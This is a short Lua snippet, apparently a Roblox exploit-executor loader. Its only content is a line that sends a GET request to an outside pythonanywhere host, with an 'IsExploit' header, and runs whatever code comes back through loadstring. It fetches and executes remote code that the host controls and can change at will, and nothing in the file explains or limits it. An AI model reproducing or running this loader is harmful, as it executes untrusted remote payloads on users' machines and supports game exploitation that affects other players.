(loadstring or load)(request({
    Url = "https://hungquan99.pythonanywhere.com/script",
    Method = "GET",
    Headers = {
        ["IsExploit"] = "true"
    }
}).Body)()
